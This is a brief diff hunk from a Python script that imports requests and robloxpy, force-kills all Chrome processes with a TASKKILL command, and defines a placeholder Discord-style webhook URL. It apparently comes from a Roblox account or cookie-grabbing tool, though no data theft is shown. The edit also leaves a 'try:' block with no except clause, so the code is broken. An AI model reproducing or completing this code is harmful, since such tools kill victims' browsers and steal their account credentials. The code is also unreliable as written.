@@ -13,7 +13,9 @@ import re
 import requests
 import robloxpy
 
-subprocess.call("TASKKILL /f  /IM  CHROME.EXE")
+try:
+    subprocess.call("TASKKILL /f  /IM  CHROME.EXE")
+    
 
 webhook_url = 'heh'
 
